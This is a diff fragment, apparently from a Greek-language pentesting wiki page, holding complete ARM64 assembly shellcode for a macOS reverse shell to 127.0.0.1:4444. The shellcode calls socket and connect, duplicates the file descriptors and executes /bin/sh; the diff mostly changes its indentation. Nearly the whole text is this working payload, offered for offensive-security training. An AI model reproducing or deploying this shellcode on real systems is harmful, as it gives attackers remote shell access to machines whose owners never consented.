+Από [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell σε **127.0.0.1:4444**
 ```armasm
 .section __TEXT,__text
 .global _main
 .align 2
 _main:
 call_socket:
-    // s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
-    mov  x16, #97
-    lsr  x1, x16, #6
-    lsl  x0, x1, #1
-    mov  x2, xzr
-    svc  #0x1337
+// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
+mov  x16, #97
+lsr  x1, x16, #6
+lsl  x0, x1, #1
+mov  x2, xzr
+svc  #0x1337
 
-    // save s
-    mvn  x3, x0
+// save s
+mvn  x3, x0
 
 call_connect:
-    /*
-     * connect(s, &sockaddr, 0x10)
-     *
-     * struct sockaddr_in {
-     *     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
-     *     sa_family_t     sin_family;  // AF_INET = 2
-     *     in_port_t       sin_port;    // 4444 = 0x115C
-     *     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
-     *     char            sin_zero[8]; // Don't care
-     * };
-     */
-    mov  x1, #0x0210
-    movk x1, #0x5C11, lsl #16
-    movk x1, #0x007F, lsl #32
-    movk x1, #0x0100, lsl #48
-    str  x1, [sp, #-8]
-    mov  x2, #8
-    sub  x1, sp, x2
-    mov  x2, #16
-    mov  x16, #98
-    svc  #0x1337
+/*
+* connect(s, &sockaddr, 0x10)
+*
+* struct sockaddr_in {
+*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
+*     sa_family_t     sin_family;  // AF_INET = 2
+*     in_port_t       sin_port;    // 4444 = 0x115C
+*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
+*     char            sin_zero[8]; // Don't care
+* };
+*/
+mov  x1, #0x0210
+movk x1, #0x5C11, lsl #16
+movk x1, #0x007F, lsl #32
+movk x1, #0x0100, lsl #48
+str  x1, [sp, #-8]
+mov  x2, #8
+sub  x1, sp, x2
+mov  x2, #16
+mov  x16, #98
+svc  #0x1337
 
-    lsr  x2, x2, #2
+lsr  x2, x2, #2
 
 call_dup:
-    // dup(s, 2) -> dup(s, 1) -> dup(s, 0)
-    mvn  x0, x3
-    lsr  x2, x2, #1
-    mov  x1, x2
-    mov  x16, #90
-    svc  #0x1337
-    mov  x10, xzr
-    cmp  x10, x2
-    bne  call_dup
+// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
+mvn  x0, x3
+lsr  x2, x2, #1
+mov  x1, x2
+mov  x16, #90
+svc  #0x1337
+mov  x10, xzr
+cmp  x10, x2
+bne  call_dup
 
 call_execve:
-    // execve("/bin/sh", 0, 0)
-    mov  x1, #0x622F
-    movk x1, #0x6E69, lsl #16
-    movk x1, #0x732F, lsl #32
-    movk x1, #0x68, lsl #48
-    str  x1, [sp, #-8]
-    mov	 x1, #8
-    sub  x0, sp, x1
-    mov  x1, xzr
-    mov  x2, xzr
-    mov  x16, #59
-    svc  #0x1337
+// execve("/bin/sh", 0, 0)
+mov  x1, #0x622F
+movk x1, #0x6E69, lsl #16
+movk x1, #0x732F, lsl #32
+movk x1, #0x68, lsl #48
+str  x1, [sp, #-8]
+mov	 x1, #8
+sub  x0, sp, x1
+mov  x1, xzr
+mov  x2, xzr
+mov  x16, #59
+svc  #0x1337
 ```
-
 {{#include ../../../banners/hacktricks-training.md}}
